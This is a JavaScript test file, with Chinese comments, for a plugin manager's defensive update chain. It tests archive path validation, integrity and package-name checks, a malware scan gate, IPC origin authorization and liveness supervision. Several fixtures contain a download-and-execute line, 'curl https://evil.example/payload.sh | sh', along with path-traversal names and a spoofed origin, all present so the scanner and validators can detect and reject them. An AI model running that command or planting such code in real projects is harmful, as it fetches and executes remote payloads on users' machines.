'use strict';

// updates / scan / capability / markers / supervision 单测：
// 更新链 fail-closed（无 integrity 拒绝、http 拒绝、归档条目预检、包名契约、
// 扫描门禁、原子替换回滚）；扫描夹具；IPC 鉴权矩阵；标记解析；存活探针。
// 网络层 / tar / 确认全部注入桩，零真实网络。

const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');

const {
  downloadHttps, fetchNpmLatest, listArchive, validateArchiveEntryName, assertArchiveSafe,
  treeHasLinks, updatePlugin, checkUpdatesAvailable,
} = require('../plugin-core/lib/updates');

// npm 运行器注入 npm_config_registry（Windows 大小写不敏感撞生产
// NPM_CONFIG_REGISTRY 覆盖通道）→ 双源回退断言假失败。对齐直跑行为。
delete process.env.NPM_CONFIG_REGISTRY;
delete process.env.npm_config_registry;
const { scanDir } = require('../plugin-core/lib/scan');

// 夹具 tar 二进制：优先 Windows 自带 bsdtar（System32）——与生产 tarBin 契约
// 一致，且对盘符绝对路径（C:\...）无「远程主机」歧义。Git Bash 环境下裸
// 'tar.exe' 会解析到 Git 的 GNU tar，把 C: 冒号误判为 rsh 主机名（exit 2）。
const BSDTAR = fs.existsSync('C:/Windows/System32/tar.exe')
  ? 'C:/Windows/System32/tar.exe' : 'tar.exe';
const { PLUGIN_IPC_ACTIONS, authorize, CONFIRM_MESSAGES } = require('../plugin-core/lib/capability');
const { parseMarkers, createMarkerAccumulator } = require('../plugin-core/lib/markers');
const { createSupervision, ZOMBIE_MARKER } = require('../plugin-core/lib/supervision');

const tmp = (t) => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'pc-upd-'));
  t.after(() => fs.rmSync(dir, { recursive: true, force: true }));
  return dir;
};

// ── 归档条目预检 ────────────────────────────────────────────────────────────

test('validateArchiveEntryName: 拒绝 ../、绝对路径、盘符、NUL', () => {
  assert.ok(validateArchiveEntryName('package/lib/index.js'));
  assert.ok(validateArchiveEntryName('./package/a.js'));
  assert.ok(!validateArchiveEntryName('../evil.js'));
  assert.ok(!validateArchiveEntryName('package/../../evil.js'));
  assert.ok(!validateArchiveEntryName('/etc/passwd'));
  assert.ok(!validateArchiveEntryName('C:/evil.js'));
  assert.ok(!validateArchiveEntryName('a\0b.js'));
});

test('validateArchiveEntryName: Windows 归一化防御（尾随点/空格、ADS、保留名）', () => {
  // 尾随点/空格归一化后为 .. → 拒绝
  assert.ok(!validateArchiveEntryName('package/.. '));
  assert.ok(!validateArchiveEntryName('package/..'));
  assert.ok(!validateArchiveEntryName('package/...'));
  assert.ok(!validateArchiveEntryName('package/.. .'));
  // ADS 流分隔符
  assert.ok(!validateArchiveEntryName('package/a.js:evil'));
  // 保留设备名（大小写不敏感）
  assert.ok(!validateArchiveEntryName('CON'));
  assert.ok(!validateArchiveEntryName('package/com1.js'));
  assert.ok(!validateArchiveEntryName('package/NUL.txt'));
  assert.ok(!validateArchiveEntryName('package/aux'));
  // 正常名字不受影响
  assert.ok(validateArchiveEntryName('package/converter.js'));
  assert.ok(validateArchiveEntryName('package/console-helper.js'));
});

test('assertArchiveSafe: 链接/设备类型条目拒绝', () => {
  assert.throws(() => assertArchiveSafe(['package/a.js'], ['-', 'l']), /链接/);
  assert.throws(() => assertArchiveSafe(['package/a.js'], ['d', 'h']), /链接/);
  assert.throws(() => assertArchiveSafe(['../x'], ['-']), /越界/);
  assert.ok(assertArchiveSafe(['package/a.js', 'package/b.css'], ['-', 'd']));
});

// ── 网络层（注入桩） ────────────────────────────────────────────────────────

test('downloadHttps: 仅 https；重定向降级拒绝；环上限', async () => {
  const okRequest = async (url) => ({ statusCode: 200, headers: {}, body: Buffer.from('OK') });
  const body = await downloadHttps('https://a.example/x', { request: okRequest });
  assert.equal(body.toString(), 'OK');
  await assert.rejects(downloadHttps('http://a.example/x', { request: okRequest }), (e) => e.code === 'UPDATE_BAD_URL');
  const redirectHttp = async (url) => ({ statusCode: 302, headers: { location: 'http://b.example/y' }, body: Buffer.alloc(0) });
  await assert.rejects(downloadHttps('https://a.example/x', { request: redirectHttp }), (e) => e.code === 'UPDATE_BAD_URL');
});

test('fetchNpmLatest: integrity 缺失时调用方 fail-closed（UPDATE_NO_INTEGRITY）', async (t) => {
  const dir = tmp(t);
  // 直接构造 updatePlugin 场景：npm 元数据无 integrity → 拒绝，且不落任何目录。
  const profileDir = path.join(dir, 'profiles', 'web');
  fs.mkdirSync(path.join(profileDir, 'node_modules', 'some-plugin'), { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'some-plugin', 'package.json'), JSON.stringify({ name: 'some-plugin', version: '1.0.0' }));
  const request = async (url) => {
    if (url.includes('/latest')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '1.1.0', dist: { tarball: 'https://registry.example/some-plugin.tgz', integrity: '' } })) };
    }
    return { statusCode: 200, headers: {}, body: Buffer.from('TARBALL') };
  };
  const res = await updatePlugin({
    id: 'some-plugin', name: 'some-plugin', profileDir, source: { kind: 'npm', pkg: 'some-plugin' },
    request, confirm: async () => true,
  });
  assert.equal(res.ok, false);
  assert.equal(res.error.code, 'UPDATE_NO_INTEGRITY');
  // 目录未被改动
  assert.ok(fs.existsSync(path.join(profileDir, 'node_modules', 'some-plugin', 'package.json')));
});

test('updatePlugin: 包名不匹配拒绝（UPDATE_PACKAGE_MISMATCH）', async (t) => {
  const dir = tmp(t);
  const profileDir = path.join(dir, 'profiles', 'web');
  fs.mkdirSync(path.join(profileDir, 'node_modules', 'target-pkg'), { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '1.0.0' }));
  // 构造一个「解压后包名不同」的 tar 场景：用注入的 tar 输出 + 真实 tar.exe 解压本地目录。
  const payloadDir = path.join(dir, 'payload');
  fs.mkdirSync(path.join(payloadDir, 'package'), { recursive: true });
  fs.writeFileSync(path.join(payloadDir, 'package', 'package.json'), JSON.stringify({ name: 'other-pkg', version: '2.0.0' }));
  // 生成真实 tgz（Windows 自带 tar.exe）
  const { spawnSync } = require('node:child_process');
  const tgz = path.join(dir, 'p.tgz');
  const pack = spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
  if (pack.status !== 0) { t.skip('tar.exe 不可用'); return; }
  const request = async (url) => {
    if (url.includes('/latest')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '2.0.0', dist: { tarball: 'https://registry.example/p.tgz', integrity: 'sha512-' + require('node:crypto').createHash('sha512').update(fs.readFileSync(tgz)).digest('base64') } })) };
    }
    return { statusCode: 200, headers: {}, body: fs.readFileSync(tgz) };
  };
  const res = await updatePlugin({
    id: 'target-pkg', name: 'target-pkg', profileDir, source: { kind: 'npm', pkg: 'target-pkg' },
    request, confirm: async () => true,
  });
  assert.equal(res.ok, false);
  assert.equal(res.error.code, 'UPDATE_PACKAGE_MISMATCH');
  assert.ok(fs.existsSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json')), '旧版原样保留');
});

test('updatePlugin: 完整性不匹配拒绝（UPDATE_INTEGRITY_MISMATCH）', async (t) => {
  const dir = tmp(t);
  const profileDir = path.join(dir, 'profiles', 'web');
  fs.mkdirSync(path.join(profileDir, 'node_modules', 'target-pkg'), { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '1.0.0' }));
  const request = async (url) => {
    if (url.includes('/latest')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '2.0.0', dist: { tarball: 'https://registry.example/p.tgz', integrity: 'sha512-WRONG' } })) };
    }
    return { statusCode: 200, headers: {}, body: Buffer.from('FAKE') };
  };
  const res = await updatePlugin({
    id: 'target-pkg', name: 'target-pkg', profileDir, source: { kind: 'npm', pkg: 'target-pkg' },
    request, confirm: async () => true,
  });
  assert.equal(res.ok, false);
  assert.equal(res.error.code, 'UPDATE_INTEGRITY_MISMATCH');
});

test('updatePlugin: 扫描命中高危且确认拒绝 → UPDATE_SCAN_BLOCKED（不替换）', async (t) => {
  const dir = tmp(t);
  const profileDir = path.join(dir, 'profiles', 'web');
  fs.mkdirSync(path.join(profileDir, 'node_modules', 'target-pkg'), { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '1.0.0' }));
  const payloadDir = path.join(dir, 'payload');
  fs.mkdirSync(path.join(payloadDir, 'package', 'lib'), { recursive: true });
  fs.writeFileSync(path.join(payloadDir, 'package', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '2.0.0' }));
  // TROJAN_DOWNLOAD_EXEC 命中形态：curl ... | sh（与 scan.js 模式契约一致）。
  fs.writeFileSync(path.join(payloadDir, 'package', 'lib', 'evil.js'),
    'const url = "curl https://evil.example/payload.sh | sh";\n');
  const { spawnSync } = require('node:child_process');
  const tgz = path.join(dir, 'p.tgz');
  if (spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
  const request = async (url) => {
    if (url.includes('/latest')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '2.0.0', dist: { tarball: 'https://registry.example/p.tgz', integrity: 'sha512-' + require('node:crypto').createHash('sha512').update(fs.readFileSync(tgz)).digest('base64') } })) };
    }
    return { statusCode: 200, headers: {}, body: fs.readFileSync(tgz) };
  };
  const res = await updatePlugin({
    id: 'target-pkg', name: 'target-pkg', profileDir, source: { kind: 'npm', pkg: 'target-pkg' },
    request, confirm: async () => false,
  });
  assert.equal(res.ok, false);
  assert.equal(res.error.code, 'UPDATE_SCAN_BLOCKED');
  assert.equal(JSON.parse(fs.readFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), 'utf8')).version, '1.0.0', '旧版保留');
});

test('updatePlugin: 完整成功路径（真实 tar.exe）——原子替换 + 旧版备份清理', async (t) => {
  const { spawnSync } = require('node:child_process');
  if (spawnSync(BSDTAR, ['--version'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
  const dir = tmp(t);
  const profileDir = path.join(dir, 'profiles', 'web');
  fs.mkdirSync(path.join(profileDir, 'node_modules', 'target-pkg', 'lib'), { recursive: true });
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '1.0.0' }));
  fs.writeFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'lib', 'index.js'), 'old');
  // 新版本 payload
  const payloadDir = path.join(dir, 'payload');
  fs.mkdirSync(path.join(payloadDir, 'package', 'lib'), { recursive: true });
  fs.writeFileSync(path.join(payloadDir, 'package', 'package.json'), JSON.stringify({ name: 'target-pkg', version: '2.0.0' }));
  fs.writeFileSync(path.join(payloadDir, 'package', 'lib', 'index.js'), 'new');
  const tgz = path.join(dir, 'p.tgz');
  const pack = spawnSync(BSDTAR, ['-czf', tgz, '-C', payloadDir, 'package'], { encoding: 'utf8' });
  assert.equal(pack.status, 0, 'tar 打包成功');
  const integrity = 'sha512-' + require('node:crypto').createHash('sha512').update(fs.readFileSync(tgz)).digest('base64');
  const request = async (url) => {
    if (url.includes('/latest')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '2.0.0', dist: { tarball: 'https://registry.example/p.tgz', integrity } })) };
    }
    return { statusCode: 200, headers: {}, body: fs.readFileSync(tgz) };
  };
  const res = await updatePlugin({
    id: 'target-pkg', name: 'target-pkg', profileDir, source: { kind: 'npm', pkg: 'target-pkg' },
    request, confirm: async () => true, spawnSync, tarBin: BSDTAR,
  });
  assert.ok(res.ok, '更新应成功: ' + JSON.stringify(res));
  assert.equal(res.version, '2.0.0');
  const newPkg = JSON.parse(fs.readFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'package.json'), 'utf8'));
  assert.equal(newPkg.version, '2.0.0', '新版本已就位');
  assert.equal(fs.readFileSync(path.join(profileDir, 'node_modules', 'target-pkg', 'lib', 'index.js'), 'utf8'), 'new');
  // 旧版备份已清理（成功路径不残留 .bak）
  const leftovers = fs.readdirSync(path.join(profileDir, 'node_modules')).filter((n) => n.startsWith('target-pkg.bak-'));
  assert.deepEqual(leftovers, [], '成功路径不残留 .bak');
});

// ── 扫描夹具 ────────────────────────────────────────────────────────────────

test('scanDir: 高危模式命中 / 干净目录零发现 / 内置包跳过', (t) => {
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'evil'), { recursive: true });
  // TROJAN_DOWNLOAD_EXEC 命中形态：curl ... | sh（与 scan.js 模式契约一致）。
  fs.writeFileSync(path.join(dir, 'evil', 'index.js'), 'const url = "curl https://evil.example/payload.sh | sh";\n');
  fs.mkdirSync(path.join(dir, 'clean'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'clean', 'index.js'), 'export const x = 1;\n');
  const findings = scanDir({ root: dir, maxDepth: 2 });
  assert.equal(findings.length, 1);
  assert.equal(findings[0].code, 'TROJAN_DOWNLOAD_EXEC');
  // 内置包跳过
  fs.mkdirSync(path.join(dir, 'builtin'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'builtin', 'package.json'), JSON.stringify({ name: 'builtin-pkg' }));
  fs.writeFileSync(path.join(dir, 'builtin', 'index.js'), 'const url = "curl https://evil.example/payload.sh | sh";\n');
  const findings2 = scanDir({ root: dir, builtinNames: new Set(['builtin-pkg']), maxDepth: 2 });
  assert.equal(findings2.length, 1, '内置包被跳过，仅 evil 命中');
  assert.ok(findings2[0].file.includes('evil'));
});

// ── capability 鉴权矩阵 ─────────────────────────────────────────────────────

test('capability: 全部插件管理动作已登记 originCheck；sender/frame/origin 三关', () => {
  for (const [action, spec] of Object.entries(PLUGIN_IPC_ACTIONS)) {
    assert.equal(spec.originCheck, true, action);
  }
  const win = { webContents: { id: 1 } };
  const goodEvent = { sender: win.webContents, senderFrame: { url: 'http://127.0.0.1:58217/chat' } };
  const deps = { mainWindow: win, getWebUrl: () => 'http://127.0.0.1:58217' };
  assert.ok(authorize(goodEvent, deps, 'dsh:plugin-list').ok);
  assert.ok(authorize(goodEvent, deps, 'dsh:plugin-uninstall').ok);
  // 异 origin（含历史前缀撞名形态）
  const evilEvent = { sender: win.webContents, senderFrame: { url: 'http://127.0.0.1:58217.evil.com/x' } };
  assert.ok(!authorize(evilEvent, deps, 'dsh:plugin-list').ok);
  // 非主窗 sender
  const otherEvent = { sender: { id: 99 }, senderFrame: { url: 'http://127.0.0.1:58217/' } };
  assert.ok(!authorize(otherEvent, deps, 'dsh:plugin-uninstall').ok);
  // 未登记动作
  assert.ok(!authorize(goodEvent, deps, 'dsh:unknown-action').ok);
  // 破坏性动作有确认文案
  assert.ok(CONFIRM_MESSAGES.uninstall);
  assert.ok(CONFIRM_MESSAGES.update);
  assert.ok(CONFIRM_MESSAGES['backup-restore']);
});

// ── markers ─────────────────────────────────────────────────────────────────

test('markers: 隔离与归因标记解析；跨 chunk 累积', () => {
  const { isolations, attributes } = parseMarkers(
    '[loader-isolation] entry evil.plugin (evil-plugin) failed to apply: boom\n' +
    '[crash-shield] attribute: @scope/pkg count: 3\n'
  );
  assert.deepEqual(isolations, [{ id: 'evil.plugin', name: 'evil-plugin' }]);
  assert.deepEqual(attributes, [{ source: '@scope/pkg', count: 3 }]);
  const acc = createMarkerAccumulator();
  acc('[loader-isolation] entry part');
  const r = acc('ial.id (pkg) failed: x\n');
  assert.deepEqual(r.isolations, [{ id: 'partial.id', name: 'pkg' }]);
});

// ── supervision 存活探针 ────────────────────────────────────────────────────

test('supervision: 连续探活失败触发 onZombie；恢复后清零；grace/cooldown 不误伤', async () => {
  let now = 1000000;
  const timers = { now: () => now };
  let healthy = true;
  let zombie = 0;
  let busy = false;
  const sv = createSupervision({
    getBaseUrl: () => 'http://127.0.0.1:1',
    httpGet: async () => ({ statusCode: healthy ? 200 : 503 }),
    isBusy: () => busy,
    onZombie: async () => { zombie += 1; healthy = true; },
    timers,
    intervalMs: 1000, graceMs: 0, cooldownMs: 0, failThreshold: 3, probeTimeoutMs: 100,
  });
  sv.start();
  await sv.tick(); await sv.tick(); await sv.tick(); // 前三次健康
  assert.equal(zombie, 0);
  healthy = false;
  await sv.tick(); await sv.tick();
  assert.equal(zombie, 0, '未达阈值不触发');
  await sv.tick();
  assert.equal(zombie, 1, '第 3 次连续失败触发 onZombie');
  sv.stop();
  assert.equal(sv.state().stopped, true);
});

test('supervision: isBusy 为真时即使达阈值也不重启（插件变更期间不误伤）', async () => {
  let now = 2000000;
  let busy = true;
  let zombie = 0;
  const sv = createSupervision({
    getBaseUrl: () => 'http://127.0.0.1:1',
    httpGet: async () => ({ statusCode: 503 }),
    isBusy: () => busy,
    onZombie: async () => { zombie += 1; },
    timers: { now: () => now },
    intervalMs: 1000, graceMs: 0, cooldownMs: 0, failThreshold: 2, probeTimeoutMs: 100,
  });
  sv.start();
  await sv.tick(); await sv.tick();
  assert.equal(zombie, 0);
  busy = false;
  await sv.tick();
  assert.equal(zombie, 1);
  sv.stop();
});

// ── checkUpdatesAvailable（注入请求桩） ─────────────────────────────────────

test('checkUpdatesAvailable: 有源且未卸载才检查；npm 双源回退', async () => {
  const calls = [];
  const request = async (url) => {
    calls.push(url);
    if (url.includes('registry.npmmirror.com')) {
      return { statusCode: 200, headers: {}, body: Buffer.from(JSON.stringify({ version: '9.9.9', dist: { tarball: 'https://registry.example/x.tgz', integrity: 'sha512-AAAA' } })) };
    }
    return { statusCode: 503, headers: {}, body: Buffer.alloc(0) };
  };
  const rows = [
    { id: 'a', name: 'pkg-a', removed: false },
    { id: 'b', name: 'pkg-b', removed: true },
    { id: 'c', name: 'pkg-c', removed: false },
  ];
  const items = await checkUpdatesAvailable(rows, { a: { kind: 'npm', pkg: 'pkg-a' }, b: { kind: 'npm', pkg: 'pkg-b' } }, () => '1.0.0', { request });
  assert.equal(items.length, 1, '仅未卸载且有源的插件被检查');
  assert.equal(items[0].id, 'a');
  assert.equal(items[0].latest, '9.9.9');
  assert.ok(items[0].hasUpdate);
  assert.ok(calls.some((u) => u.includes('registry.npmjs.org')), '先试官方');
  assert.ok(calls.some((u) => u.includes('registry.npmmirror.com')), '再试镜像');
});

// ── treeHasLinks / listArchive（真实 tar.exe） ──────────────────────────────

test('treeHasLinks: 符号链接检测（junction 视平台）', (t) => {
  if (process.platform !== 'win32') { t.skip('Windows 专用'); return; }
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'real'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'real', 'f.txt'), 'x');
  fs.symlinkSync(path.join(dir, 'real'), path.join(dir, 'link'), 'junction');
  assert.ok(treeHasLinks(dir));
});

test('listArchive: 真实 tgz 列名与类型（bsdtar）', (t) => {
  const { spawnSync } = require('node:child_process');
  const dir = tmp(t);
  fs.mkdirSync(path.join(dir, 'package'), { recursive: true });
  fs.writeFileSync(path.join(dir, 'package', 'a.txt'), 'x');
  const tgz = path.join(dir, 'p.tgz');
  if (spawnSync(BSDTAR, ['-czf', tgz, '-C', dir, 'package'], { encoding: 'utf8' }).status !== 0) { t.skip('tar.exe 不可用'); return; }
  const { names, types } = listArchive(BSDTAR, tgz, { spawnSync });
  assert.ok(names.some((n) => n.includes('a.txt')));
  assert.ok(types.every((ty) => ty === '-' || ty === 'd'));
});
